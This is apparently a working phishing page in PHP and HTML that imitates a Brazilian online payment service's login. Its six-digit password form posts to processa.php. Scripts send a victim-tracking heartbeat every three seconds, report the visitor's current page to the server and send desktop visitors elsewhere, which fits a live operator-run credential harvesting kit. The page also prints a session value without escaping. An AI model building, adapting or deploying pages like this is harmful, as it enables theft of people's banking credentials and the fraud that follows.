<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $_SESSION['identificador'] = $_POST['identificador'];
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

    html, body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #fff;
      overflow-x: hidden;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      padding: 16px;
      border-bottom: 1px solid #dcdcdc;
    }

    .header img {
      height: 36px;
      margin-left: 30px;
    }

    .flag {
      background: #f5f5f5;
      border: 1px solid #ccc;
      border-radius: 20px;
      padding: 6px 12px;
      font-size: 13px;
      margin-right: 30px;
    }

    .container {
      max-width: 360px;
      margin: 0 auto;
      padding: 30px 20px 20px;
      flex: 1;
    }

    .title-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }

    .title-row h2 {
      font-size: 18px;
      font-weight: 500;
      color: #000;
    }

    .info-icon {
      width: 23px;
      height: 23px;
      background: url('imagens/info.svg') no-repeat center center;
      background-size: contain;
      display: inline-block;
      margin-left: 6px;
    }

    .subinfo {
      font-size: 13px;
      color: #666;
      margin-bottom: 18px;
      line-height: 1.4;
    }

    .trocar {
      font-size: 13px;
      color: #007fc7;
      text-decoration: none;
      float: right;
      margin-top: -3px;
    }

    .senha-digitos {
      display: flex;
      justify-content: flex-start;
      gap: 6px;
      margin-bottom: 24px;
      position: relative;
    }

    .senha-digitos input {
      width: 30px;
      height: 50px;
      font-size: 20px;
      border-radius: 10px;
      border: 1px solid #444;
      text-align: center;
      caret-color: transparent;
    }

    .senha-digitos input:focus {
      outline: 2px solid #007fc7;
      caret-color: auto;
    }

    .eye {
      position: absolute;
      right: 50px;
      top: 12px;
      width: 20px;
      height: 20px;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 2px;
      margin-top: 10px;
    }

    .forgot {
      text-align: center;
      font-size: 14px;
      margin: 16px 0 24px;
    }

    .forgot a {
      color: #007fc7;
      text-decoration: none;
    }

    .comunicar {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #333;
      gap: 8px;
      margin-bottom: 18px;
    }

    .comunicar img {
      width: 22px;
      height: 22px;
    }

    .comunicar::after {
      content: '>';
      margin-left: auto;
      color: #007fc7;
      font-weight: bold;
      font-size: 18px;
    }

    .line {
      height: 1px;
      background-color: #ddd;
      margin: 20px 0 18px;
    }

    .recaptcha {
      font-size: 12px;
      color: #555;
      text-align: center;
      margin-bottom: 16px;
      line-height: 1.5;
    }

    .recaptcha a {
      color: #007fc7;
      text-decoration: none;
      margin: 0 4px;
    }

    .ou {
    display: flex;
    align-items: center;
    justify-content: center;
    color: #888;
    font-size: 12px;
    margin: 16px 0;
    font-weight: bold;
    }

    .ou::before,
    .ou::after {
    content: "";
    height: 1px;
    background-color: #ccc;
    width: 80px; /* ⬅️ define o comprimento das linhas */
    margin: 0 8px;
    }

    .baixar {
      text-align: center;
    }

    .baixar button {
      border: 1px solid #007fc7;
      background: #fff;
      color: #007fc7;
      border-radius: 2px;
      padding: 10px 20px;
      font-weight: bold;
      font-size: 14px;
      width: auto;
      min-width: 150px;
      margin-top: 10px;
    }

    .rodape {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
      margin-top: auto;
    }

    .rodape img {
      height: 22px;
      margin-bottom: 10px;
    }

    .rodape p {
      margin: 4px 0;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="flag" style="
    font-size: 14px;
    padding: 6px 16px;
    border-radius: 24px;
    display: flex;
    align-items: center;
    gap: 6px;
    margin-left: auto;
    margin-right: 40px;
    ">
    PT
    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#007fc7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-top: 1px;">
        <polyline points="6 9 12 15 18 9" />
    </svg>
    </div>
  </div>

  <div class="container">
    <form action="processa.php" method="POST">
      <div class="title-row">
        <h2>Digite sua senha</h2>
        <span class="info-icon"></span>
      </div>

      <div class="subinfo">
        Sua conta<br>
        <strong><?php echo $_SESSION['identificador'] ?? ''; ?></strong>
        <a class="trocar" href="login.php">Trocar</a>
      </div>

      <div class="senha-digitos">
        <?php for ($i = 0; $i < 6; $i++): ?>
          <input type="password" inputmode="numeric" pattern="[0-9]*" name="senha[]" maxlength="1" required>
        <?php endfor; ?>
        <img src="imagens/eye-closed.svg" alt="Ver senha" class="eye" id="eyeToggle" onclick="toggleSenha()">
      </div>

      <button type="submit">Entrar</button>

      <div class="forgot">
        <a href="#">Esqueceu sua senha?</a>
      </div>

      <div class="comunicar">
        <img src="imagens/icon-phone.svg" alt="">
        Comunicar perda ou roubo de celular
      </div>

      <div class="line"></div>

      <div class="recaptcha">
        Protegido por reCAPTCHA.<br>
        <a href="#">Privacidade</a> e <a href="#">Termos de Serviço</a>
      </div>

      <div class="ou">ou</div>

      <div class="baixar">
        <div>Baixe o aplicativo</div>
        <button>Baixar aplicativo</button>
      </div>
    </form>
  </div>

  <div class="rodape">
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
  </div>

  <script>
  let visivel = false;

  function toggleSenha() {
    const campos = document.querySelectorAll('.senha-digitos input');
    const eyeIcon = document.getElementById('eyeToggle');
    visivel = !visivel;

    campos.forEach(input => {
      input.type = visivel ? 'text' : 'password';
    });

    eyeIcon.src = visivel ? 'imagens/eye-blue.svg' : 'imagens/eye-closed.svg';
  }

  document.querySelectorAll('.senha-digitos input').forEach((input, index, inputs) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && input.value === '' && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  document.addEventListener("DOMContentLoaded", function () {
    const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
    if (!isMobile) {
      window.location.href = "senha-desktop.php";
    }
  });
</script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'senha.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
</body>
</html>
